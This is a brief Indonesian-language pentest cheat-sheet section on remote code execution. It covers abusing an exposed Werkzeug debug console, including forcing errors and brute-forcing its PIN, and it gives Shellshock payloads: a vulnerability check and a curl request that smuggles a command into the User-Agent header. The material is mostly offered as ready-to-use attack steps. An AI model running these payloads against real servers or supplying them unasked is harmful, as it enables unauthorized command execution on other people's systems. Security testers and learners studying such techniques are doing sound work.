## RCE

**Werkzeug Debugger**

Temukan tempat di mana input pengguna dapat diberikan dan kirimkan string berikut untuk menyebabkan kesalahan:

```
strіng
```

Jika target menjalankan aplikasinya dalam mode debug, Anda mungkin dapat menjalankan perintah. Jika Anda menjalankan target secara lokal, Anda mungkin dapat memaksa PIN debugger. PIN debugger selalu dalam format berikut: `***-***-***`.

**Shellshock Bug**

```bash
() { :;}; echo vulnerable
```

```zsh
curl -H "User-Agent: () { :; }; /bin/eject" http://example.com/
```